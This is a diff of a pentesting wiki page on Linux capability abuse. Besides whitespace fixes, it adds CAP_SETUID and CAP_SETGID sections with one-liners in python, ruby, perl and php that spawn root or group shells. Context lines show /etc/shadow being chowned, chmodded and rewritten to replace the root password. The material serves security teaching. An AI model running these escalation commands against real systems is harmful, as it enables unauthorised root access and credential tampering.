@@ -95,7 +95,7 @@ $ sudo -l
 {% endtab %}
 
 {% tab title="Exploit" %}
-For example, we can leverage the `CAP_SETUID` capabilities with the `python` binary&#x20;
+For example, we can leverage the `CAP_SETUID` capabilities with the `python` binary
 
 ```bash
 #SUID setcap example
@@ -120,7 +120,7 @@ Retaining this capability is often necessary for containers which mimic entire s
 {% endtab %}
 
 {% tab title="Exploit - Python" %}
-For example, if python have the `CAP_SYS_ADMIN` capabilities,  we can mount a modified _passwd_ file on top of the real _passwd_ file.
+For example, if python have the `CAP_SYS_ADMIN` capabilities, we can mount a modified _passwd_ file on top of the real _passwd_ file.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -160,13 +160,13 @@ If you are in a docker container and `CAP_SYS_ADMIN` is enabled, then you can es
 
 {% tabs %}
 {% tab title="Desc" %}
-[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use `ptrace(2)` and recently introduced cross memory attach system calls such as `process_vm_readv(2)` and `process_vm_writev(2)`.&#x20;
+[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use `ptrace(2)` and recently introduced cross memory attach system calls such as `process_vm_readv(2)` and `process_vm_writev(2)`.
 
 If this capability is granted and the `ptrace(2)` system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53).
 {% endtab %}
 
 {% tab title="Exploit - Python" %}
-For example, if **python** have the `CAP_SYS_PTRACE` capabilities,  we can inject a shellcode in a root process memory.
+For example, if **python** have the `CAP_SYS_PTRACE` capabilities, we can inject a shellcode in a root process memory.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -342,9 +342,9 @@ process 207009 is executing new program: /usr/bin/dash
 
 {% tabs %}
 {% tab title="Desc" %}
-[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the process to load and unload arbitrary kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls).&#x20;
+[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the process to load and unload arbitrary kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls).
 
-This could lead to trivial privilege escalation and ring-0 compromise. The kernel can be modified at will, subverting all system security, Linux Security Modules, and container systems.&#x20;
+This could lead to trivial privilege escalation and ring-0 compromise. The kernel can be modified at will, subverting all system security, Linux Security Modules, and container systems.
 
 **This means that you can** **insert/remove kernel modules in/from the kernel of the host machine.**
 {% endtab %}
@@ -418,7 +418,7 @@ make
 If you can't find the /lib/modules/\<version>/build folder, this is because you have not download the linux headers of your kernel version
 {% endhint %}
 
-Finally, we can execute this python code&#x20;
+Finally, we can execute this python code
 
 ```bash
 #On target machine
@@ -513,7 +513,7 @@ nc -lvnp 4444
 
 {% tabs %}
 {% tab title="Desc" %}
-[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to **bypass file read, and directory read and execute permissions**. While this was designed to be used for searching or reading files, it also grants the process permission to invoke `open_by_handle_at(2)`.&#x20;
+[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to **bypass file read, and directory read and execute permissions**. While this was designed to be used for searching or reading files, it also grants the process permission to invoke `open_by_handle_at(2)`.
 
 Any process with the capability `CAP_DAC_READ_SEARCH` can use `open_by_handle_at(2)` to gain access to any file, even files outside their mount namespace. The handle passed into `open_by_handle_at(2)` is intended to be an opaque identifier retrieved using `name_to_handle_at(2)`. However, this handle contains sensitive and tamperable information, such as inode numbers. This was first shown to be an issue in Docker containers by Sebastian Krahmer with [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) exploit.
 
@@ -521,7 +521,7 @@ Any process with the capability `CAP_DAC_READ_SEARCH` can use `open_by_handle_at
 {% endtab %}
 
 {% tab title="Exploit - Python" %}
-In the following example the **`python`** binary has this capability.&#x20;
+In the following example the **`python`** binary has this capability.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -539,7 +539,7 @@ $ python3.11 exploit.py
 {% endtab %}
 
 {% tab title="Exploit - Tar" %}
-In the following example the **`tar`** binary has this capability.&#x20;
+In the following example the **`tar`** binary has this capability.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -574,7 +574,7 @@ tar -cxf shadow.tar.gz
 {% endtab %}
 
 {% tab title="Exploit - Python" %}
-In the following example the **`python`** binary has this capability.&#x20;
+In the following example the **`python`** binary has this capability.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -599,8 +599,6 @@ $ sudo /bin/bash
 #or
 $ sudo su
 ```
-
-
 
 **Alternatively**, we can overwritte the `/etc/passwd` file. First we have to generate a new password hash
 
@@ -651,7 +649,7 @@ su - root
 {% endtab %}
 
 {% tab title="Exploit Vim" %}
-In the following example the **`vim`** binary has this capability.&#x20;
+In the following example the **`vim`** binary has this capability.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -680,6 +678,7 @@ root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF
 ```
 
 We can now easily `su` as root
+
 ```bash
 su - root
 ```
@@ -690,13 +689,13 @@ su - root
 
 {% tabs %}
 {% tab title="Desc" %}
-[**CAP\_CHOWN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)  allow us make arbitrary changes to file UIDs and GIDs.
+[**CAP\_CHOWN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us make arbitrary changes to file UIDs and GIDs.
 
 **This means that it's possible to change the ownership of any file.**
 {% endtab %}
 
 {% tab title="Exploit - Python" %}
-In the following example the **`python`** binary has this capability.&#x20;
+In the following example the **`python`** binary has this capability.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -704,12 +703,14 @@ $ getcap -r / 2>/dev/null
 ```
 
 We can abuse it to modify the file owner of the `/etc/shadow` file or the `/root`. First we can check what is our current user id
+
 ```bash
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 Replace the attribute numbers with the current user id.
+
 ```bash
 #Get /etc/shadow
 $ python -c 'import os;os.chown("/etc/shadow",33,33)'
@@ -719,6 +720,7 @@ $ python -c 'import os;os.chown("/root",33,33)'
 ```
 
 We can now generate a new hash
+
 ```bash
 #Using mkpasswd
 $ mkpasswd  -m sha-512 -S saltsalt -s
@@ -731,6 +733,7 @@ $6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y
 ```
 
 And edit the `/etc/shadow` file to change the root password
+
 ```bash
 #Replace the hash
 $ vim /etc/shadow
@@ -739,12 +742,14 @@ root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF
 ```
 
 We can now easily `su` as root
+
 ```bash
 su - root
 ```
 {% endtab %}
+
 {% tab title="Exploit - Ruby" %}
-In the following example the **`ruby`** binary has this capability.&#x20;
+In the following example the **`ruby`** binary has this capability.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -752,12 +757,14 @@ $ getcap -r / 2>/dev/null
 ```
 
 We can abuse it to modify the file owner of the `/etc/shadow` file or the `/root` directory. First we can check what is our current user id
+
 ```bash
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 Replace the attribute numbers with the current user id.
+
 ```bash
 #Get /etc/shadow
 $ ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/etc/shadow")'
@@ -767,6 +774,7 @@ $ ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/root")'
 ```
 
 We can now generate a new hash
+
 ```bash
 #Using mkpasswd
 $ mkpasswd  -m sha-512 -S saltsalt -s
@@ -779,6 +787,7 @@ $6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y
 ```
 
 And edit the `/etc/shadow` file to change the root password
+
 ```bash
 #Replace the hash
 $ vim /etc/shadow
@@ -787,6 +796,7 @@ root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF
 ```
 
 We can now easily `su` as root
+
 ```bash
 su - root
 ```
@@ -803,7 +813,7 @@ su - root
 {% endtab %}
 
 {% tab title="Exploit - Python" %}
-In the following example the **`python`** binary has this capability.&#x20;
+In the following example the **`python`** binary has this capability.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -811,6 +821,7 @@ $ getcap -r / 2>/dev/null
 ```
 
 We can abuse it to modify the file permissions of the `/etc/shadow`. First generate a new hash
+
 ```bash
 #Using mkpasswd
 $ mkpasswd  -m sha-512 -S saltsalt -s
@@ -823,11 +834,13 @@ $6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y
 ```
 
 Give us permissions over the `/etc/shadow` file
+
 ```bash
 $ python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
 
 And edit the `/etc/shadow` file to change the root password
+
 ```bash
 #Replace the hash
 $ vim /etc/shadow
@@ -836,12 +849,14 @@ root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF
 ```
 
 We can now easily `su` as root
+
 ```bash
 su - root
 ```
 {% endtab %}
+
 {% tab title="Exploit - Ruby" %}
-In the following example the **`ruby`** binary has this capability.&#x20;
+In the following example the **`ruby`** binary has this capability.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -849,6 +864,7 @@ $ getcap -r / 2>/dev/null
 ```
 
 We can abuse it to modify the file permissions of the `/etc/shadow`. First generate a new hash
+
 ```bash
 #Using mkpasswd
 $ mkpasswd  -m sha-512 -S saltsalt -s
@@ -861,11 +877,13 @@ $6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y
 ```
 
 Give us permissions over the `/etc/shadow` file
+
 ```bash
 $ ruby -e 'require "fileutils"; FileUtils.chmod(0666, "/etc/shadow")'
 ```
 
 And edit the `/etc/shadow` file to change the root password
+
 ```bash
 #Replace the hash
 $ vim /etc/shadow
@@ -874,22 +892,80 @@ root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF
 ```
 
 We can now easily `su` as root
+
 ```bash
 su - root
 ```
 {% endtab %}
 {% endtabs %}
 
-
 #### CAP\_SETUID
 
 {% tabs %}
 {% tab title="Desc" %}
+[**CAP**](https://man7.org/linux/man-pages/man7/capabilities.7.html)[**\_SETUID**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to make arbitrary manipulations of process UIDs (`setuid(2)`, `setreuid(2)`, `setresuid(2)`, `setfsuid(2)`);
 
+**This means that it's possible to set the effective user id of the created process.**
 {% endtab %}
 
-{% tab title="Exploit" %}
+{% tab title="Exploit - Python" %}
+In the following example the **`python`** binary has this capability.
 
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/python3.11 = cap_setuid+ep
+```
+
+We can abuse it to spawn an elevated shell
+
+```bash
+$ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+{% endtab %}
+
+{% tab title="Exploit - Ruby" %}
+In the following example the **`ruby`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/ruby = cap_setuid+ep
+```
+
+We can abuse it to spawn an elevated shell
+
+```bash
+$ ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+```
+{% endtab %}
+
+{% tab title="Exploit - Perl" %}
+In the following example the **`perl`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/perl = cap_setuid+ep
+```
+
+We can abuse it to spawn an elevated shell
+
+```bash
+$ perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+```
+{% endtab %}
+
+{% tab title="Exploit - PHP" %}
+In the following example the **`php`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/php8.2 = cap_setuid+ep
+```
+
+We can abuse it to spawn an elevated shell
+
+```bash
+$ php -r "posix_setuid(0); system('/bin/bash');"
+```
 {% endtab %}
 {% endtabs %}
 
@@ -897,159 +973,175 @@ su - root
 
 {% tabs %}
 {% tab title="Desc" %}
+[**CAP\_SETGID**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to Make arbitrary manipulations of process GIDs and supplementary GID list.
 
+**This means that it's possible to set the effective group id of the created process.**
 {% endtab %}
 
-{% tab title="Exploit" %}
+{% tab title="Exploit - Python" %}
+In the following example the **`python`** binary has this capability.
 
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/python3.11 = cap_setgid+ep
+```
+
+In this case you should look for interesting files that a group can read/write because you can impersonate any group:
+
+```bash
+#Find every file writable by a group
+$ find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file writable by a group in /etc with a maxpath of 1
+$ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file readable by a group in /etc with a maxpath of 1
+$ find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
+```
+
+Find the group id of the targeted group
+
+```bash
+$ cat /etc/group
+[...]
+shadow:x:42:
+[...]
+```
+
+We can spawn a shell with the targeted GID&#x20;
+
+```bash
+$ python -c 'import os; os.setgid(42); os.system("/bin/bash")'
+```
+{% endtab %}
+
+{% tab title="Exploit - Ruby" %}
+In the following example the **`ruby`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/ruby = cap_setgid+ep
+```
+
+In this case you should look for interesting files that a group can read/write because you can impersonate any group:
+
+```bash
+#Find every file writable by a group
+$ find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file writable by a group in /etc with a maxpath of 1
+$ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file readable by a group in /etc with a maxpath of 1
+$ find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
+```
+
+Find the group id of the targeted group
+
+```bash
+$ cat /etc/group
+[...]
+shadow:x:42:
+[...]
+```
+
+We can spawn a shell with the targeted GID&#x20;
+
+```bash
+$ ruby -e 'Process::Sys.setgid(42); exec "/bin/sh"'
+```
+{% endtab %}
+
+{% tab title="Exploit - Perl" %}
+In the following example the **`perl`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/perl = cap_setgid+ep
+```
+
+In this case you should look for interesting files that a group can read/write because you can impersonate any group:
+
+```bash
+#Find every file writable by a group
+$ find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file writable by a group in /etc with a maxpath of 1
+$ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file readable by a group in /etc with a maxpath of 1
+$ find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
+```
+
+Find the group id of the targeted group
+
+```bash
+$ cat /etc/group
+[...]
+shadow:x:42:
+[...]
+```
+
+We can spawn a shell with the targeted GID&#x20;
+
+```bash
+$ perl -e 'use POSIX (setgid); POSIX::setgid(42); exec "/bin/bash";'
+```
+{% endtab %}
+
+{% tab title="Exploit - PHP" %}
+In the following example the **`php`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/php8.2 = cap_setgid+ep
+```
+
+In this case you should look for interesting files that a group can read/write because you can impersonate any group:
+
+```bash
+#Find every file writable by a group
+$ find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file writable by a group in /etc with a maxpath of 1
+$ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file readable by a group in /etc with a maxpath of 1
+$ find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
+```
+
+Find the group id of the targeted group
+
+```bash
+$ cat /etc/group
+[...]
+shadow:x:42:
+[...]
+```
+
+We can spawn a shell with the targeted GID&#x20;
+
+```bash
+$ php -r "posix_setgid(42); system('/bin/bash');"
+```
 {% endtab %}
 {% endtabs %}
 
 #### CAP\_SETFCAP
 
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
-
 #### CAP\_SYS\_RAWIO
-
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
 
 #### CAP\_KILL
 
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
-
 #### CAP\_NET\_BIND\_SERVICE
-
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
 
 #### CAP\_NET\_RAW
 
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
-
 #### CAP\_NET\_ADMIN + CAP\_NET\_RAW
-
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
 
 #### CAP\_LINUX\_IMMUTABLE
 
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
-
 #### CAP\_SYS\_CHROOT
-
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
 
 #### CAP\_SYS\_BOOT
 
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
-
 #### CAP\_SYSLOG
-
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
 
 #### CAP\_MKNOD
 
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
-
 #### CAP\_SETPCAP
-
-{% tabs %}
-{% tab title="Desc" %}
-
-{% endtab %}
-
-{% tab title="Exploit" %}
-
-{% endtab %}
-{% endtabs %}
-
-
 
 ## References
 
